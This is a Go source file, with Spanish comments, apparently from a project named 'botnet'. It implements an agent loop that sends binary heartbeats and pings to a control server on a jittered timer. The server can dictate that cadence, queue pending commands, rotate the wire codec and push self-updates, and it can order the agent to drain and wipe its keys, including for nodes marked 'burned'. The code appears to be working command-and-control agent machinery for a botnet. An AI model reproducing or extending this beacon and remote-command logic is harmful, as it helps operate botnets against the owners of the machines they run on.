package agent

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"time"

	"github.com/botnet/botnet/internal/hbcodec"
	"github.com/botnet/botnet/internal/state"
	"github.com/botnet/botnet/internal/tunnel"
	"github.com/botnet/botnet/pkg/proto"
)

// HeartbeatClient porta el heartbeat binario al plano de control. En F1
// viaja como POST sobre HTTPS al stub; EP-04 lo muda a frame
// FrameHeartbeat sobre el tunel TLS/H2 sin tocar esta firma. El canal de
// control es binario por mandato: JSON prohibido — el cuerpo de Beat,
// Ping y Ack es binario puro: el JSON de 550 B del plano F1 muere aqui.
type HeartbeatClient struct {
	Endpoint string
	NodeID   [16]byte
	AgentVer string
	HTTP     *http.Client

	// CodecRev: el config_rev que decrete el backend en la respuesta
	// del heartbeat (EP-11 T-1106 AC3). 0 = nadie lo ha decretado
	// todavia: el latido sale por el nucleo proto (>= 200 B). Rev > 0
	// = el alambre cambia al frame compacto de internal/hbcodec con el
	// layout que marca CodecForConfigRev — hot-swap sin reinicio: el
	// siguiente Beat ya nace codificado con la rev mandada.
	CodecRev uint64
}

// httpc devuelve el cliente compartido o uno con timeout de 15 s.
func (c *HeartbeatClient) client() *http.Client {
	if c.HTTP == nil {
		return &http.Client{Timeout: 15 * time.Second}
	}
	return c.HTTP
}

// Beat envia un latido y devuelve el codigo (200 ok, 410
// retiring|burned) y la respuesta. Un cuerpo vacio es un stub
// compatible: responde zero-values sin error.
func (c *HeartbeatClient) Beat(ctx context.Context, seq uint32, rssKiB uint32, uptimeS uint64, streams uint16) (int, proto.HeartbeatResponse, error) {
	body, err := c.beatBody(seq, rssKiB, uptimeS, streams)
	if err != nil {
		return 0, proto.HeartbeatResponse{}, err
	}
	status, respBody, err := c.post(ctx, "/v1/heartbeat", body)
	if err != nil {
		return status, proto.HeartbeatResponse{}, err
	}
	var hr proto.HeartbeatResponse
	if len(respBody) > 0 {
		if err := hr.Unmarshal(respBody); err != nil {
			return status, hr, err
		}
	}
	if status != http.StatusOK && status != http.StatusGone {
		return status, hr, &EnrollError{Code: status, Body: string(respBody)}
	}
	return status, hr, nil
}

// beatBody elige el codec del latido segun config_rev (T-1106 AC3):
// sin rev decretada, el nucleo proto historico; con rev del backend,
// el frame compacto de hbcodec en la version que dicta
// CodecForConfigRev — el mismo payload, otro layout en el alambre.
func (c *HeartbeatClient) beatBody(seq uint32, rssKiB uint32, uptimeS uint64, streams uint16) ([]byte, error) {
	if c.CodecRev == 0 {
		hb := proto.Heartbeat{
			NodeID:   c.NodeID,
			Seq:      seq,
			RssKiB:   rssKiB,
			UptimeS:  uptimeS,
			Streams:  streams,
			AgentVer: c.AgentVer,
		}
		return hb.Marshal()
	}
	up := uint32(uptimeS)
	if uptimeS > 0xFFFFFFFF {
		up = 0xFFFFFFFF
	}
	hc := hbcodec.Heartbeat{
		NodeID:   c.NodeID,
		Seq:      seq,
		RssKiB:   rssKiB,
		UptimeS:  up,
		Streams:  streams,
		AgentVer: c.AgentVer,
	}
	return hbcodec.EncodeVersioned(&hc, hbcodec.CodecForConfigRev(c.CodecRev))
}

// Ping es el keepalive parcial de los ticks que NO son heartbeat
// completo (T-0403: cadencia unica, ratio parciales:heartbeats = 2:1).
// El payload es hbcodec.Ping: binario, de 6..14 B.
func (c *HeartbeatClient) Ping(ctx context.Context, seq uint32) error {
	_, _, err := c.post(ctx, "/v1/ping", hbcodec.Ping(seq))
	return err
}

// Ack confirma los pending_cmds encajados (T-0409: "los ack en el
// siguiente heartbeat"). Body = proto.CmdAckMsg binario.
func (c *HeartbeatClient) Ack(ctx context.Context, ids []string) error {
	msg := proto.CmdAckMsg{NodeID: c.NodeID, IDs: ids}
	body, err := msg.Marshal()
	if err != nil {
		return err
	}
	_, _, err = c.post(ctx, "/v1/cmdack", body)
	return err
}

func (c *HeartbeatClient) post(ctx context.Context, path string, body []byte) (int, []byte, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, c.Endpoint+path, bytes.NewReader(body))
	if err != nil {
		return 0, nil, err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Node-Id", FormatUUID(c.NodeID))
	resp, err := c.client().Do(req)
	if err != nil {
		return 0, nil, fmt.Errorf("agent: POST %s: %w", path, err)
	}
	defer resp.Body.Close()
	respBody, err := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if err != nil {
		return resp.StatusCode, nil, err
	}
	return resp.StatusCode, respBody, nil
}

// AgentDeps cablea el bucle de agente del modo node.json valido.
type AgentDeps struct {
	Log       *slog.Logger
	Machine   *state.Machine
	Client    *HeartbeatClient
	Manager   *EntitlementManager
	Sup       *Supervisor
	IntervalS int // cadencia base; la respuesta puede acortarla (§5)

	// EP-04 — transporte y cadencias.
	Cadence  *tunnel.Cadence     // temporizador unico con jitter (T-0403); nil = server-driven F1
	StateDir string              // donde viven cert.pem/secret.bin: bye los borra (T-0409)
	Drain    func() error        // drena sesiones antes del bye/410 (plano de datos)
	Flush    func() error        // ultimo flush contable (T-0409 AC3)
	Cmds     *CmdQueue           // pending_cmds con dedup por id (T-0409 AC2)
	OnDelay  func(time.Duration) // hook de test: intervalo aplicado al siguiente frame

	// T-1404 AC2 — commit de self-update tras latidos sanos (H2).
	Commit  *CommitTimer // nil = sin temporizador
	Updater *Updater     // fija la version estable local
	Version string       // version en ejecucion, la que se fija
	Streams func() int   // sesiones vivas; sin hook se asume 0
}

// RunAgentLoop es el bucle del modo agente: un solo temporizador por
// nodo — cada tick porta un frame de aplicacion (ping parcial o
// heartbeat completo cada 3.er tick) —, cadencia que puede dictar el
// servidor, entitlements aplicados en caliente y bye como salida limpia
// que borra las claves (baja por pull sin router vivo, injerto P3).
// El heap watchdog corre en su unica goroutine (T-0301 AC3).
func RunAgentLoop(ctx context.Context, d AgentDeps) error {
	if d.IntervalS <= 0 {
		d.IntervalS = 120
	}
	interval := time.Duration(d.IntervalS) * time.Second
	start := time.Now()
	if d.Sup == nil {
		d.Sup = NewSupervisor(d.Log)
	}
	go d.Sup.WatchHeap(ctx, 30*time.Second, nil)
	var seq uint32
	var acks []string // ids encajados cuyo ack viaja en el ciclo siguiente
	for {
		seq++
		_, heapKiB := IdleFootprint()
		uptimeS := uint64(time.Since(start).Seconds())
		var done bool
		interval, done = d.applyBeat(ctx, seq, uint32(heapKiB), uptimeS, &acks)
		if done {
			return nil
		}
		delay := interval
		if d.Cadence != nil {
			delay = d.Cadence.Next()
		}
		if d.OnDelay != nil {
			d.OnDelay(delay)
		}
		select {
		case <-ctx.Done():
			return nil
		case <-time.After(delay):
		}
	}
}

// applyBeat ejecuta el tick: ping parcial o heartbeat completo segun la
// regla 1-de-3; procesa la respuesta (config_rev, cadencia dictada,
// pending_cmds con dedup, 410, bye). Devuelve el intervalo vigente
// (puede reescribirlo el servidor: next_interval_s).
// Devuelve el intervalo vigente y done=true cuando el bucle debe salir
// (410 o bye): la baja no depende de un POST saliente.
func (d AgentDeps) applyBeat(ctx context.Context, seq uint32, heapKiB uint32, uptimeS uint64, acks *[]string) (time.Duration, bool) {
	interval := time.Duration(d.IntervalS) * time.Second
	// keepalive parcial: los ticks que no son heartbeat completo.
	if d.Cadence != nil && !tunnel.BeatKind(uint64(seq)) {
		if perr := d.Client.Ping(ctx, seq); perr != nil {
			d.Log.Warn("ping fallo", "seq", seq, "err", perr)
		}
		return interval, false
	}
	var status int
	var hr proto.HeartbeatResponse
	var beatErr error
	if rerr := d.Sup.RunCritical("heartbeat", func() {
		status, hr, beatErr = d.Client.Beat(ctx, seq, heapKiB, uptimeS, 0)
	}); rerr != nil {
		d.Log.Error("supervisor: heartbeat recuperado", "err", rerr)
	}
	switch {
	case beatErr != nil:
		d.Log.Warn("heartbeat fallo", "status", status, "err", beatErr)
		return interval, false
	case status == http.StatusGone:
		// 410 retiring|burned: modo drain — sin streams nuevos; las
		// claves siguen vivas (el backend puede levantar el estado).
		d.Log.Warn("heartbeat 410: retiring|burned — drain", "status", status)
		d.drainAndFlush()
		if d.Machine != nil {
			_ = d.Machine.Transition(state.Bye)
		}
		return interval, true
	case status == http.StatusOK:
		d.Log.Info("HEARTBEAT 200 ok", "seq", seq)
		// El backend decrete config_rev (>0): el proximo latido sale
		// codificado con el codec compacto de hbcodec y el layout que
		// marca CodecForConfigRev — rotacion en caliente, sin
		// reinicio (T-1106 AC3: el consumer que faltaba).
		if d.Client != nil && hr.ConfigRev > 0 {
			d.Client.CodecRev = uint64(hr.ConfigRev)
		}
		if d.Manager != nil && hr.ConfigRev > 0 {
			d.Manager.Apply(&hr)
		}
		if hr.NextIntervalS > 0 {
			interval = time.Duration(hr.NextIntervalS) * time.Second
			if d.Cadence != nil {
				d.Cadence.Base = interval
				if d.Cadence.Max < interval+d.Cadence.Jitter+time.Second {
					d.Cadence.Max = interval + d.Cadence.Jitter + time.Second
				}
			}
		}
		// ack del ciclo anterior en este heartbeat (T-0409 AC2), y
		// encolado con dedup por id de los cmds nuevos.
		if d.Cmds != nil && len(*acks) > 0 {
			if aerr := d.Client.Ack(ctx, *acks); aerr != nil {
				d.Log.Warn("cmdack fallo", "err", aerr) // se reintenta
			} else {
				*acks = nil
			}
		}
		if d.Cmds != nil && len(hr.PendingCmds) > 0 {
			*acks = append(*acks, d.Cmds.Enqueue(hr.PendingCmds)...)
		}
		// T-1404 AC2: una version descargada se fija tras latidos sanos
		// con trafico real. Sin streams servidos no se fija nada.
		if d.Commit != nil && d.Updater != nil && d.Version != "" {
			streams := 0
			if d.Streams != nil {
				streams = d.Streams()
			}
			if d.Commit.Beat(true, streams) {
				if cerr := d.Updater.Commit(d.Version); cerr != nil {
					d.Log.Warn("update: commit fallo", "err", cerr)
				} else {
					d.Log.Info("update=commit", "version", d.Version,
						"racha_sana_s", int(d.Commit.after.Seconds()))
				}
			}
		}
		if hr.Bye && d.Machine != nil {
			d.Log.Info("bye: drenar, ultimo flush y borrar claves")
			d.drainAndFlush()
			if err := WipeKeys(d.StateDir); err != nil {
				d.Log.Warn("wipe de claves", "err", err)
			}
			_ = d.Machine.Transition(state.Bye)
			return interval, true
		}
	}
	return interval, false
}

func (d AgentDeps) drainAndFlush() {
	if d.Drain != nil {
		if err := d.Drain(); err != nil {
			d.Log.Warn("drain", "err", err)
		}
	}
	if d.Flush != nil {
		if err := d.Flush(); err != nil {
			d.Log.Warn("flush", "err", err)
		}
	}
}
